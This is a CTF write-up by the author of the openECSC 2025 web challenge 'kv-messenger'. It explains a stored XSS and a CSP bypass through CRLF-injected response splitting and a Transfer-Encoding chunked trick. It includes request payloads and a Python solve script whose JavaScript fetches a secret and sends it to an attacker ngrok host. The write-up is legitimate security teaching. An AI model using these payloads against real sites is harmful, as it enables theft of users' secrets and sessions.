# kv-messenger

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
  - [Explore Functionalities](#explore-functionalities)
  - [Source Code Review](#source-code-review)
    - [Stored XSS](#stored-xss)
    - [CSP Bypass](#csp-bypass)
    - [CRLF Injection -> Response Splitting](#crlf-injection---response-splitting)
    - [Intended: `Transfer-Encoding` Trick in HTTP/1.1](#intended-transfer-encoding-trick-in-http11)
    - [Unintended: Fixed `Content-Length` Value](#unintended-fixed-content-length-value)
- [Exploitation](#exploitation)
- [Why I Made This Challenge](#why-i-made-this-challenge)
- [Conclusion](#conclusion)

</details>

## Overview

- Author: @siunam (Me!)
- 22 solves / 423 points

## Background

I developed a simple Key-Value (KV) store message app! You can share your messages to others!

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251006111831.png)

## Enumeration

### Explore Functionalities

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003141112.png)

In this web application, we can create a new message, retrieve, view, and download different messages by UUID.

Let's try to create a dummy message!

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003141413.png)

Now that we have a new message with UUID `ad06921a-aad5-4848-bc8c-899d8100c832`, let's try to get the message:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003141537.png)

For viewing the message, when we provided a message UUID and clicked the "View message" button, it'll open a tab to path `/download?uuid=<message_uuid>&view=True`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003141651.png)

For downloading the message, we can provide a message UUID and the download filename:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003141810.png)

Which downloads an HTML file with the following content:

```html
<h1>Message (UUIDv4: ad06921a-aad5-4848-bc8c-899d8100c832)</h1><code><pre>Hello World!</pre></code>
```

Hmm... Maybe there's a stored XSS in viewing the message endpoint?

Let's read the application's source code!

### Source Code Review

In this challenge, we can download a [file](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/openECSC-2025/web/kv-messenger/kv-messenger.tar.gz):

```bash
┌[siunam@~/ctf/openECSC-2025/web/kv-messenger]-[2025/10/03|14:26:52(HKT)]
└> file kv-messenger.tar.gz                                
kv-messenger.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 30720
┌[siunam@~/ctf/openECSC-2025/web/kv-messenger]-[2025/10/03|14:26:53(HKT)]
└> tar -v --extract --file kv-messenger.tar.gz 
kv-messenger/
kv-messenger/Dockerfile
kv-messenger/docker-compose.yaml
kv-messenger/src/
kv-messenger/src/static/
kv-messenger/src/static/css/
kv-messenger/src/static/css/main.css
kv-messenger/src/static/js/
kv-messenger/src/static/js/main.js
kv-messenger/src/bot.py
kv-messenger/src/app.py
kv-messenger/src/templates/
kv-messenger/src/templates/index.html
```

In this web application, the web server is written in Python with library [`http.server`](https://docs.python.org/3/library/http.server.html).

In `src/app.py`, this web server is served via class [`ThreadingHTTPServer`](https://docs.python.org/3/library/http.server.html#http.server.ThreadingHTTPServer) with handler class `MessageHandler`:

```python
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
[...]
class MessageHandler(BaseHTTPRequestHandler):
    [...]
def runServer(serverClass=ThreadingHTTPServer, handlerClass=MessageHandler, port=8000):
    serverAddress = ('0.0.0.0', port)
    httpd = serverClass(serverAddress, handlerClass)
    [...]
    httpd.serve_forever()

if __name__ == '__main__':
    runServer()
```

First off, where's the flag? What's our objective in this challenge?

In `src/app.py`, we can see that the flag is in a random message:

```python
from os import getenv
[...]
FLAG_UUID = str(uuid4())
[...]
messageStore = dict()
messageStore[FLAG_UUID] = getenv('FLAG', 'openECSC{FAKE_FLAG}')
```

Which means, we need to **somehow read the flag message**.

In class `MessageHandler` method `_handleFlagMessage`, it'll first check if the request has cookie `secret`, and its value is equal to `bot.SECRET` or not:

```python
from http.cookies import SimpleCookie
[...]
import bot
[...]
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _handleFlagMessage(self):
        [...]
        cookies = SimpleCookie()
        cookies.load(cookieHeader)
        secretCookie = cookies.get('secret')
        if not secretCookie or secretCookie.value != bot.SECRET:
            responseBody = json.dumps({ 'error': 'Incorrect secret value' })
            return self._sendResponse(HTTPStatus.BAD_REQUEST, responseBody, CONTENT_TYPE['json'])
        [...]
```

If the `secret` cookie check is passed, it'll send the flag message to us in JSON format:

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _handleFlagMessage(self):
        [...]
        responseBody = json.dumps({ 'uuid': FLAG_UUID, 'value': messageStore[FLAG_UUID] })
        return self._sendResponse(HTTPStatus.OK, responseBody, CONTENT_TYPE['json'])
```

This method is called from the class's [`do_GET`](https://docs.python.org/3/library/http.server.html#http.server.SimpleHTTPRequestHandler.do_GET) method:

```python
import urllib.parse
[...]
class MessageHandler(BaseHTTPRequestHandler):
    _getEndpoints = {
        'index': [ '/', '/index.html' ],
        'static': [ f'/{STATIC_FILE_PATH}/css/main.css', f'/{STATIC_FILE_PATH}/js/main.js' ],
        'message': [ '/message' ],
        'download': [ '/download' ],
        'flag': [ '/flag' ]
    }
    [...]
    def do_GET(self):
        parsedPath = urllib.parse.urlparse(self.path)
        path = parsedPath.path
        [...]
        if path in self._getEndpoints['flag']:
            return self._handleFlagMessage()
```

Cool! So if we somehow know the value of `bot.SECRET`, we should be able to get the flag message by sending a GET request to `/flag`!

In `src/bot.py`, the `SECRET` value is a cryptographically secure random hex string, and it's in the `FLAG_COOKIE` dictionary:

```python
SECRET = getenv('SECRET', token_hex(32))
FLAG_COOKIE = {
    'name': 'secret',
    'value': SECRET,
    'path': '/',
    'httpOnly': True
}
```

In function `visit`, a [headless Chrome browser](https://developer.chrome.com/docs/chromium/headless) will be launched with the following options using library [Selenium](https://www.selenium.dev/):

```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
[...]
chromeOptions = Options()
chromeOptions.add_argument('--headless')
chromeOptions.add_argument('--no-sandbox')
chromeOptions.add_argument('--disable-dev-shm-usage')
chromeOptions.add_argument('--disable-gpu')
chromeOptions.add_argument('--no-gpu')
chromeOptions.add_argument('--disable-default-apps')
chromeOptions.add_argument('--disable-translate')
chromeOptions.add_argument('--disable-device-discovery-notifications')
chromeOptions.add_argument('--disable-software-rasterizer')
chromeOptions.add_argument('--disable-xss-auditor')
chromeOptions.add_argument('--disable-extensions')
chromeOptions.add_argument('--disable-features=DownloadBubble')
chromeOptions.add_argument('--js-flags=--noexpose_wasm,--jitless')

def visit(url):
    [...]
    try:
        print(f'[*] The bot is visiting URL: {url}')
        browser = webdriver.Chrome(options=chromeOptions)
        [...]
    [...]
```

It'll then go to `http://localhost:8000/` (`APP_URL`), wait for 1 second, and set new cookie `FLAG_COOKIE`:

```python
from time import sleep
[...]
APP_DOMAIN = 'localhost:8000'
APP_URL = f'http://{APP_DOMAIN}/'
[...]
def visit(url):
    [...]
    try:
        [...]
        browser.get(APP_URL)
        sleep(1)
        browser.add_cookie(FLAG_COOKIE)
        [...]
    [...]
```

Finally, the browser will go to `url`, wait for 5 seconds, and close the browser:

```python
[...]
def visit(url):
    [...]
    try:
        [...]
        browser.get(url)
        sleep(5)
        isSuccess = True
        print('[+] The bot has successfully visited your URL')
    except Exception as error:
        print(f'[-] The bot failed to visit your URL: {error}')
    finally:
        if browser is not None:
            browser.quit()

        return isSuccess
```

The application will call this function in `src/app.py`, method `_handleReport`. In it, it'll verify the POST body JSON data's `url` key must start with `http://localhost:8000/`. After that, the browser visits our given `url`:

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _handleReport(self):
        data = self._readPostJsonBody()
        [...]
        url = data.get('url')
        [...]
        if bot.APP_URL_REGEX.match(url) is None:
            responseBody = json.dumps({ 'error': f'Invalid URL. Regex pattern: {bot.APP_URL_REGEX.pattern} '})
            return self._sendResponse(HTTPStatus.BAD_REQUEST, responseBody, CONTENT_TYPE['json'])
        
        isSuccess = bot.visit(url)
        [...]
```

Hmm... Based on this `visit` function, we'll need to find some client-side vulnerabilities to get the flag message, because the headless browser has the `secret` cookie!

#### Stored XSS

Previously, we suspect that viewing messages could lead to stored XSS, because our messages don't seem to be escaped or sanitized.

We can confirm our theory by reading method `_handleViewMessage`'s logic. If we send a GET request with parameter `view=True`, it'll call that method:

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def do_GET(self):
        [...]
        query = urllib.parse.parse_qs(parsedPath.query)
        [...]
        if path in self._getEndpoints['download']:
            isViewMessage = True if query.get('view', [ None ])[0] == 'True' else False
            if isViewMessage:
                return self._handleViewMessage(query)
            [...]
```

In that method, it'll first validate our provided message UUID via function `isValidMessage`:

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _handleViewMessage(self, query):
        uuidParam = query.get('uuid', [ None ])[0]
        if not isValidMessage(uuidParam):
            responseBody = json.dumps({ 'error': 'No UUID is provided or message not found' })
            return self._sendResponse(HTTPStatus.BAD_REQUEST, responseBody, CONTENT_TYPE['json'])
        [...]
```

Which simply validates our UUID must be a valid UUIDv4 string, and the UUID cannot be the one in flag message:

```python
def isValidMessage(uuid):
    if not uuid:
        return False
    if uuid not in messageStore:
        return False
    try:
        uuidObject = UUID(uuid)
    except:
        return False
    if uuidObject.version != 4:
        return False
    if uuid == FLAG_UUID:
        return False
    
    return True
```

After the validation, it'll send a `200 OK` response with body data `generateHtmlMessage(uuidParam)` and `Content-Type` is `text/html; charset=utf-8`:

```python
CONTENT_TYPE = {
    'html': 'text/html; charset=utf-8',
    'json': 'application/json',
    'javascript': 'application/javascript',
    'css': 'text/css'
}
[...]
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _handleViewMessage(self, query):
        [...]
        return self._sendResponse(HTTPStatus.OK, generateHtmlMessage(uuidParam), CONTENT_TYPE['html'])
```

If we look at function `generateHtmlMessage`, our message is directly concatenated with the following HTML code:

```python
def generateHtmlMessage(uuid):
    return f'<h1>Message (UUIDv4: {uuid})</h1><code><pre>{messageStore[uuid]}</pre></code>'
```

Therefore, if we can inject arbitrary HTML code when we create a new message, we can achieve stored XSS! Let's see if the message creation's logic contains will escape or sanitize our input, which is handled by method `_handleCreateNewMessage`:

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def do_POST(self):
        [...]
        if path in self._postEndpoints['message']:
            return self._handleCreateNewMessage()
        [...]
```

In the handling method, if the message's value is all ASCII characters ([`isascii`](https://docs.python.org/3/library/stdtypes.html#str.isascii)), it'll generate a new message UUID and insert the new message into the `messageStore` key-value store dictionary:

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _handleCreateNewMessage(self):
        data = self._readPostJsonBody()
        [...]
        value = data.get('value')
        [...]
        if not value.isascii():
            responseBody = json.dumps({ 'error': 'Invalid message. Currently we only allow ASCII characters' })
            return self._sendResponse(HTTPStatus.BAD_REQUEST, responseBody, CONTENT_TYPE['json'])

        messageUuid = generateMessageUuid()
        messageStore[messageUuid] = value
        responseBody = json.dumps({ 'message': 'Stored successfully', 'uuid': messageUuid })
        return self._sendResponse(HTTPStatus.CREATED, responseBody, CONTENT_TYPE['json'])
```

Since our XSS payload is all ASCII characters, we should be able to inject the following payload into the message:

```shell
┌[siunam@~/ctf/openECSC-2025/web/kv-messenger]-[2025/10/03|15:54:52(HKT)]
└> python3         
[...]
>>> '<script>alert(origin)</script>'.isascii()
True
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003155913.png)

But when we view the message, our payload doesn't work:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003155945.png)

Well, it's because it got blocked by the CSP (Content Security Policy):

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003160114.png)

In method `_sendResponse`, it'll append header [`Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) into the response:

```python
CSP = 'default-src \'self\'; script-src \'self\'; script-src-elem \'self\'; base-uri \'none\'; object-src \'none\'; frame-ancestors \'none\'; frame-src \'none\'; require-trusted-types-for \'script\';'
[...]
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _sendResponse(self, statusCode, responseBody, contentType, headers=list()):
        [...]
        self.send_header('Content-Security-Policy', CSP)
        [...]
```

If we check the CSP's [directives](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy#directives) via [CSP Evaluator](https://csp-evaluator.withgoogle.com/), we can see that [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src) and [`script-src-elem`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src-elem) are set to `self`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003160632.png)

Therefore, only `<script>` tags' imported scripts' source must be same origin. For example, if the website's origin is `http://localhost:8000`, the JavaScript can only load sources that are in origin `http://localhost:8000`, such as `http://localhost:8000/foo.js`.

#### CSP Bypass

To bypass the `script-src` CSP directive, we can try to find a **CSP gadget** in the application.

> CSP gadget means it's a method to help you to bypass the CSP.

Since the message will be formatted as the following, what happens if we inject some JavaScript code?

```python
def generateHtmlMessage(uuid):
    return f'<h1>Message (UUIDv4: {uuid})</h1><code><pre>{messageStore[uuid]}</pre></code>'
```

Example:

```javascript
;alert(origin)//
```

Formatted message:

```javascript
<h1>Message (UUIDv4: 932db423-d50c-4b73-ab42-a2c2ba8b6c7a)</h1><code><pre>;alert(origin)//</pre></code>
```

We can try the above method to bypass the CSP:

- Create message 1 (CSP gadget):

```http
POST /message HTTP/1.1
Host: 6a508130-8c4a-4415-b18b-4819385ef2f7.openec.sc:31337
Content-Type: application/json
Content-Length: 28

{"value":";alert(origin)//"}
```

- Create message 2 (XSS payload):

```http
POST /message HTTP/1.1
Host: 6a508130-8c4a-4415-b18b-4819385ef2f7.openec.sc:31337
Content-Type: application/json
Content-Length: 97

{"value":"<script src='/download?uuid=<message_1_uuid>&view=True'></script>"}
```

Unfortunately, the formatted message causes an invalid JavaScript syntax:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003162413.png)

Oh btw, this approach will have the following warning:

```
The script from "[...]" was loaded even though its MIME type ("text/html") is not a valid JavaScript MIME type.
```

This is because the browser will still load the response body data as JavaScript code even though the `Content-Type` is a valid JavaScript MIME type. Feel free to read this blog post by [Huli](https://blog.huli.tw/en/) if you're interested in this quirk: [What do you know about script type?](https://blog.huli.tw/2022/04/24/en/script-type/).

We can also import JavaScript file even if the response has header `Content-Disposition`!

Anyway, with this approach, we can't really bypass the CSP because of the invalid JavaScript syntax.

Hmm... Another feature in this application is to download messages. Hopefully it's a CSP gadget for us!

Since the download message's logic is handled by method `_handleDownloadMessage`, let's dive into that method!

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def do_GET(self):
        [...]
        if path in self._getEndpoints['download']:
            [...]
            return self._handleDownloadMessage(query)
```

#### CRLF Injection -> Response Splitting

In the handling method, we can see that an extra header [`Content-Disposition`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition) is passed to the `headers` keyword argument:

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _handleDownloadMessage(self, query):
        uuidParam = query.get('uuid', [ None ])[0]
        filename = query.get('filename', [ '' ])[0].strip()
        [...]
        headers = [ { 'Content-Disposition': f'attachment; filename="{filename}.html"' } ]
        return self._sendResponse(HTTPStatus.OK, generateHtmlMessage(uuidParam), CONTENT_TYPE['html'], headers=headers)
```

In the value of that header, our `filename` GET parameter is directly concatenated to the [`filename` parameter](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition#filename).

In method `_sendResponse`, keyword argument `headers` is used to append extra headers into the response:

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _sendResponse(self, statusCode, responseBody, contentType, headers=list()):
        [...]
        if headers:
            for header in headers:
                for key, value in header.items():
                    self.send_header(key, value)
        [...]
```

Hmm... Since our `filename` parameter's value didn't get validated or sanitized, we can **inject CRLF (Carriage Return (`\r` / `%0d`) Line Feed (`\n` / `%0a`)) characters**!

For example, we can inject arbitrary headers into the response via the following payload:

```
filename=anything"%0d%0aX-Foo:+bar
```

> Note: The `filename` will be [`strip`](https://docs.python.org/3/library/stdtypes.html#str.strip)'d, which means leading and trailing whitespace characters (including CRLF characters) will be removed by default. Therefore, we need to append non-whitespace characters at the start and at the end of our `filename`.

Response:

```http
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.13.7
Content-Type: text/html; charset=utf-8
Content-Length: 90
Content-Disposition: attachment; filename="anything"
X-Foo: bar.html"

[...]
```

As we can see, header `X-Foo` is injected into the response!

But we can do much more!

Instead of injecting arbitrary headers, what if we **inject arbitrary response body data**? This is also known as [response splitting](https://book.jorianwoltjer.com/web/client-side/crlf-header-injection#response-splitting).

To do so, we can inject 2 CRLF characters:

```
anything"%0d%0a%0d%0aour+response+body+data+here
```

Response:

```http
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.13.7
Content-Type: text/html; charset=utf-8
Content-Length: 90
Content-Disposition: attachment; filename="anything"

our response body data here.html"

<h1>Message (UUIDv4: 8fdc5142-1fc5-4f7c-a5b6-317f8d591810)</h1><code><pre>foo</pre></code>
```

Now, what happens if we inject our arbitrary JavaScript code via response splitting?

```
anything"%0d%0a%0d%0aalert(origin);//
```

Unfortunately, we still get invalid JavaScript syntax:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003183944.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003183951.png)

Hmm... We now have CRLF injection, maybe we can leverage this to bypass the invalid syntax?

#### Intended: `Transfer-Encoding` Trick in HTTP/1.1

One solution that might appear in your mind is to override the `Content-Length` response header:

```
filename=anything"%0d%0aContent-Length:+13%0d%0a%0d%0aalert(origin)
```

Response:

```http
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.13.7
Content-Type: text/html; charset=utf-8
Content-Length: 90
Content-Disposition: attachment; filename="anything"
Content-Length: 13

alert(origin).html"

<h1>Message (UUIDv4: 62539c2f-92bd-48ae-a24f-2bc534c6ed22)</h1><code><pre>foo</pre></code>
```

Unfortunately, it won't work. In both Firefox and Chromium-based browsers, if there's a duplicated `Content-Length` response header, the browser will reject such response:

Firefox:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003184832.png)

Chrome:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003184854.png)

However, if the original `Content-Length` is below of our injection point, we can push it into the response body data:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: <injected_content_length>

Content-Length: <origin_content_length>response body data here
```

Sadly, this wasn't our case.

In this application, it's using HTTP/1.1 by setting attribute [`protocol_version`](https://docs.python.org/3/library/http.server.html#http.server.BaseHTTPRequestHandler.protocol_version):

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    protocol_version = 'HTTP/1.1'
```

Hmm... Since we can inject arbitrary headers, **maybe some headers can override `Content-Length` response header in HTTP/1.1**? Let's dive deeper into [RFC 9112](https://www.rfc-editor.org/rfc/rfc9112), the latest HTTP/1.1 specification!

In "[6. Message Body](https://www.rfc-editor.org/rfc/rfc9112#name-message-body)", we can see that there are 2 headers will influence the message body data length:
- [`Transfer-Encoding`](https://www.rfc-editor.org/rfc/rfc9112#name-transfer-encoding)
- [`Content-Length`](https://www.rfc-editor.org/rfc/rfc9112#name-content-length)

Since duplicated `Content-Length` response header is NOT allowed, **`Transfer-Encoding`** seems to be a better choice.

> Note: For more information about `Transfer-Encoding` header with `chunked` encoding, you could read [this PortSwigger web security academy about request smuggling](https://portswigger.net/web-security/request-smuggling#how-do-http-request-smuggling-vulnerabilities-arise).

What's more interesting is that if both `Content-Length` and `Transfer-Encoding` response header are in the response, **`Transfer-Encoding` should override `Content-Length`**.

[https://www.rfc-editor.org/rfc/rfc9112#section-6.1-14](https://www.rfc-editor.org/rfc/rfc9112#section-6.1-14):

> Early implementations of Transfer-Encoding would occasionally send both a chunked transfer coding for message framing and an estimated Content-Length header field for use by progress bars. **This is why Transfer-Encoding is defined as overriding Content-Length, as opposed to them being mutually incompatible.**
>   
> [...]
>  
> A server MAY reject a request that contains both Content-Length and Transfer-Encoding **or process such a request in accordance with the Transfer-Encoding alone.**

Since this is the HTTP/1.1 specification, most HTTP/1.1 servers and browsers will follow such condition. For example, Python `http.server` library:

```
filename=anything"%0d%0aTransfer-Encoding:+chunked%0d%0a%0d%0ad%0d%0aalert(origin)%0d%0a0%0d%0a%0d%0ajunk
```

Injected response:

```http
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.13.7
Content-Type: text/html; charset=utf-8
Content-Length: 90
Content-Disposition: attachment; filename="anything"
Transfer-Encoding: chunked

d
alert(origin)
0

junk.html"

<h1>Message (UUIDv4: 62539c2f-92bd-48ae-a24f-2bc534c6ed22)</h1><code><pre>foo</pre></code>
```

In here, the first chunk will be `alert(origin)` with the length of `0xd` (13 in decimal). After that, we terminate the other message body with `0x0` length chunk.

Final response:

```http
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.13.7
Content-Type: text/html; charset=utf-8
Content-Length: 13
Content-Disposition: attachment; filename="anything"

alert(origin)
```

Therefore, we can bypass the invalid JavaScript syntax by using **`Transfer-Encoding` with `chunked` encoding**!

- Create a dummy message

```http
POST /message HTTP/1.1
Host: localhost:8000
Referer: http://localhost:8000/
Content-Type: application/json
Content-Length: 20

{"value":"anything"}
```

- Create a message that contains our XSS payload with the CRLF injection CSP gadget

```http
POST /message HTTP/1.1
Host: localhost:8000
Referer: http://localhost:8000/
Content-Type: application/json
Content-Length: 194

{"value":"<script src='/download?uuid=<dummy_message_uuid>&filename=anything\"%0d%0aTransfer-Encoding:+chunked%0d%0a%0d%0ad%0d%0aalert(origin)%0d%0a0%0d%0a%0d%0ajunk'></script>"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003193631.png)

Nice!

After this, we can also exfiltrate the flag message via **bypassing CSP directive `default-src` with source `self` using redirect**!

*Sadly, during developing this challenge, I completely forgot to limit `filename` length, leading to the following unintended method to bypass the invalid syntax :(*

#### Unintended: Fixed `Content-Length` Value

You might notice that when we do response splitting, **the `Content-Length` response header's value didn't change**:

```
filename=anything"%0d%0a%0d%0aalert(origin)
```

Response:

```http
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.13.7
Content-Type: text/html; charset=utf-8
Content-Length: 90
Content-Disposition: attachment; filename="anything"

alert(origin).html"

<h1>Message (UUIDv4: 62539c2f-92bd-48ae-a24f-2bc534c6ed22)</h1><code><pre>foo</pre></code>
```

```
filename=anything"%0d%0a%0d%0aalert(origin);//hello??
```

Response:

```http
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.13.7
Content-Type: text/html; charset=utf-8
Content-Length: 90
Content-Disposition: attachment; filename="anything"

alert(origin);//hello??.html"

<h1>Message (UUIDv4: 62539c2f-92bd-48ae-a24f-2bc534c6ed22)</h1><code><pre>foo</pre></code>
```

This is because the response `Content-Length` header's value is calculated based on the message length:

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _handleDownloadMessage(self, query):
        [...]
        return self._sendResponse(HTTPStatus.OK, generateHtmlMessage(uuidParam), CONTENT_TYPE['html'], headers=headers)
```

```python
class MessageHandler(BaseHTTPRequestHandler):
    [...]
    def _sendResponse(self, statusCode, responseBody, contentType, headers=list()):
        responseBody = responseBody.encode()
        [...]
        self.send_header('Content-Length', str(len(responseBody)))
```

Therefore, we can simply bypass the invalid JavaScript syntax by appending junk texts, so that the length of the injected message body is greater than the fixed `Content-Length` value:

```
filename=anything"%0d%0a%0d%0aalert(origin);//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003195333.png)

> Side note: This one is also another cool CSP gadget if you can do response splitting **and** the `Content-Length` response header's value is **fixed**!

## Exploitation

Armed with the above information, we can let the headless browser's to trigger our stored XSS payload and exfiltrate the flag message to our attacker server:
1. Create a dummy message
2. Create a message that contains our XSS payload with the CRLF injection CSP gadget
3. Report step 2's URL to the bot

To automate the above steps, I've written the following Python solve script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import requests

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.MESSAGE_ENDPOINT = '/message'
        self.REPORT_ENDPOINT = '/report'
        self.BOT_APP_URL = 'http://localhost:8000'

    def createNewMessage(self, message):
        data = { 'value': message }
        return requests.post(f'{self.baseUrl}{self.MESSAGE_ENDPOINT}', json=data).json()['uuid']

    def reportToBot(self, url):
        data = { 'url': url }
        requests.post(f'{self.baseUrl}{self.REPORT_ENDPOINT}', json=data)

    def solve(self, javaScriptPayload):
        dummyMessageId = self.createNewMessage('dummy')

        javaScriptPayloadLengthHex = hex(len(javaScriptPayload)).replace('0x', '')
        payload = f'''
<script src="/download?uuid={dummyMessageId}&filename=%22%0d%0aTransfer-Encoding:+chunked%0d%0a%0d%0a{javaScriptPayloadLengthHex}%0d%0a{javaScriptPayload}%0d%0a0%0d%0a%0d%0aanything"></script>
'''.strip()
        xssMessageId = self.createNewMessage(payload)
        self.reportToBot(f'{self.BOT_APP_URL}/download?uuid={xssMessageId}&view=True')

if __name__ == '__main__':
    # baseUrl = 'http://localhost:8000' # for local testing
    baseUrl = 'https://2415b971-18d4-412d-afe6-114189c42e8b.openec.sc:31337'
    solver = Solver(baseUrl)

    attackerDomain = '0.tcp.ap.ngrok.io:13656'
    javaScriptPayload = '''
fetch(`/flag`).then((response) => (response.json())).then((responseJsonBody) => {document.location.assign(`//<attacker_domain>/?flag=${responseJsonBody['value']}`)})
'''.strip().replace('<attacker_domain>', attackerDomain)
    solver.solve(javaScriptPayload)
```

</details>

- Start our attacker web server

```shell
┌[siunam@~/ctf/openECSC-2025/web/kv-messenger]-[2025/10/03|20:11:31(HKT)]
└> python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
```

- Port forwarding using [ngrok](https://ngrok.com/)

```shell
┌[siunam@~/ctf/openECSC-2025/web/kv-messenger]-[2025/10/03|20:12:15(HKT)]
└> ngrok tcp 8001
[...]
Forwarding                    tcp://0.tcp.ap.ngrok.io:13656 -> localhost:8001                             
[...]
```

- Run the solve script

```shell
┌[siunam@~/ctf/openECSC-2025/web/kv-messenger]-[2025/10/03|20:13:08(HKT)]
└> python3 solve.py
```

- HTTP server log

```shell
┌[siunam@~/ctf/openECSC-2025/web/kv-messenger]-[2025/10/03|20:39:28(HKT)]
└> python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
127.0.0.1 - - [03/Oct/2025 20:40:36] "GET /?flag=openECSC{c21f_1nj3c710n_4nd_73_f02_7h3_w1n} HTTP/1.1" 200 -
[...]
```

- Flag: **`openECSC{c21f_1nj3c710n_4nd_73_f02_7h3_w1n}`**

## Why I Made This Challenge

This challenge was inspired from a 0-day web challenge in corCTF 2025, web/git. During solving that challenge, I found 3 XSS vulnerabilities in [Fossil SCM](https://fossil-scm.org/), where 2 of them are CRLF injection related.

In those CRLF injection vulnerabilities, I was able to gain reflected XSS via response splitting. However, the CSP has directive `script-src` and its source is `self`. Luckily, the response doesn't have `Content-Length` header and the web server uses HTTP/0.9, it's possible to bypass the CSP by injecting a new `Content-Length`  header. See [my tweet for more details](https://x.com/siunam321/status/1962525358680604980).

Also in that tweet, [@m0z](https://x.com/LooseSecurity) [suggested that](https://x.com/LooseSecurity/status/1963183777003237427) it might be possible to achieve the same goal by injecting `Transfer-Encoding` response header with `chunked` encoding:

![](https://github.com/siunam321/CTF-Writeups/blob/main/openECSC-2025/images/Pasted%20image%2020251003213227.png)

After some testing, this theory turned out to be true!

## Conclusion

What we've learned:

1. CSP bypass via a CRLF injection to response splitting CSP gadget
2. `Transfer-Encoding` trick in HTTP/1.1 to truncate invalid JavaScript syntax